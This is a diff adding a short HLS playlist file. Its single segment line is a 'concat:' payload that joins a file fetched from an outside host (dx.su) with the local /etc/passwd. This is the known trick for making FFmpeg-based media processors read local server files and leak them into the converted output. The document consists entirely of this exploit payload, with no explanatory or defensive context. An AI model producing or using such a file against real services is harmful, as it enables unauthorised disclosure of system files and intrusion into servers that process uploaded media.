@@ -1,0 +1,5 @@
+#EXTM3U
+#EXT-X-MEDIA-SEQUENCE:0
+#EXTINF:10.0,
+concat:http://dx.su/header.y4m|file:///etc/passwd
+#EXT-X-ENDLIST
